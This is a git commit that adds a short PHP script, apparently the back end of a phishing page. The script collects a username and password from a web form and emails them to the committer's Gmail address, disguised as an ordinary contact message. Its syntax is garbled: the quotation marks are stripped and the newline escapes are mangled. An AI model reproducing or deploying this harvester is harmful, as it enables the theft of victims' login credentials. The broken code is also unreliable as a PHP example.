a1957f0b54aaa5c844214ab4a1f8df8d92410fd8
mysticoficial7 <mystic.oficial7@gmail.com>
2026-04-19 19:59:10 +0200

    Add files via upload

---
+++ php.php
@@ -0,0 +1,25 @@
+php
+
+if ($_SERVER[REQUEST_METHOD] == POST) {
+
+    $usuario = htmlspecialchars($_POST[usuario]);
+    $password = htmlspecialchars($_POST[password]);
+ 
+
+    $destino = mystic.oficial7@gmail.com;
+    $asunto = Nuevo mensaje desde la web;
+
+    $contenido = Usuario $usuarion;
+    $contenido .= password $passwordn;
+
+
+    $headers = From noreply@tuweb.com;
+
+    mail($destino, $asunto, $contenido, $headers);
+
+    echo Mensaje enviado correctamente;
+
+} else {
+    echo Acceso no permitido;
+}
+
